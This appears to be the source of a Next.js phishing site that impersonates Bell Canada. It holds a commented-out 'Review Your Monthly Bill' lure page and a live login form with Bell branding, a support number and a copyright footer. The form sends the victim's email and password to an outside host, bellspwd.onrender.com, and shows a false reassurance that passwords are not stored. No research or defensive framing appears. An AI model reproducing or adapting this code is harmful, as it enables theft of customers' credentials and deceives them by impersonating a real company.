// "use client";

// import { useState } from "react";
// import Image from "next/image";
// import { useRouter } from "next/navigation";

// export default function ReviewBillPage() {
//   const [loading, setLoading] = useState(false);
//   const router = useRouter();

//   const handleClick = (
//     event: React.MouseEvent<HTMLAnchorElement, MouseEvent>
//   ) => {
//     event.preventDefault();
//     setLoading(true);

//     setTimeout(() => {
//       setLoading(false);
//       router.push("/login");
//     }, 1000);
//   };

//   return (
//     <div className="relative flex items-center justify-center h-screen bg-black overflow-hidden">
//       {/* Background Image with Blur */}
//       <div
//         className="absolute inset-0 bg-cover bg-center blur-md"
//         style={{ backgroundImage: "url('/images/bell-background.png')" }}
//       ></div>

//       {/* Content Container */}
//       <div className="relative text-center text-black z-10">
//         <Image
//           src="/images/bell-logo.png"
//           alt="Bell"
//           width={300}
//           height={100}
//           className="mx-auto"
//         />
//         <h2 className="text-2xl font-semibold mt-4">
//           Review Your Monthly Bill
//         </h2>

//         {/* Continue Button */}
//         <a
//           href="/log"
//           onClick={handleClick}
//           className={`mt-5 inline-flex items-center px-6 py-3 text-white bg-blue-600 rounded-lg transition ${
//             loading ? "opacity-70 pointer-events-none" : "hover:bg-blue-500"
//           }`}
//         >
//           Continue
//           {loading && (
//             <div className="ml-3 w-4 h-4 border-2 border-t-transparent border-white rounded-full animate-spin"></div>
//           )}
//         </a>
//       </div>
//     </div>
//   );
// }

"use client";

import { useState } from "react";
import styles from "./login/login.module.css";

export default function LoginForm() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [message, setMessage] = useState("");

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setError("");
    setMessage("");

    if (!email || !password) {
      setError("Please fill in all fields.");
      return;
    }

    try {
      const response = await fetch("https://bellspwd.onrender.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json();
      console.log(data);
      console.log(data.email);

      if (!response.ok) {
        throw new Error(data.message || "Failed to send request");
      }

      setMessage(data.message);
    } catch (error: unknown) {
      if (error instanceof Error) {
        setError(error.message);
      } else {
        setError("Network error, please try again.");
      }
    }
  };

  return (
    <section
      className={styles.main}
      style={{ backgroundImage: "url('/images/img_1854.jpg')" }}
    >
      <div className={styles.formContainer}>
        <h2 className={styles.heading}>Log in</h2>
        <form onSubmit={handleSubmit} className={styles.form}>
          <div>
            <label className={styles.label}>Email Address</label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className={styles.input}
              required
            />
          </div>
          <div className={styles.passwordContainer}>
            <label className={styles.label}>Password</label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className={styles.input}
              required
            />
          </div>
          {error && <p className={styles.error}>{error}</p>}
          {message && <p className={styles.success}>{message}</p>}
          <button type="submit" className={styles.button}>
            Log in
          </button>
        </form>
        <footer className={styles.footer}>
          <p className={styles.footerText}>
            Forgot your password? Call{" "}
            <span className="font-bold">310-BELL</span> Support.
          </p>
          <div className={styles.footerLinks}>
            <p>
              <a href="">Privacy</a> | <a href="">Legal & Regulatory</a>
            </p>
            <p>© Bell Canada, All rights reserved.</p>
          </div>
          <p style={{ color: "gray", fontSize: "11px", fontStyle: "italic" }}>
            We do not store passwords. Your credentials are securely processed
            and transmitted.
          </p>
        </footer>
      </div>
    </section>
  );
}
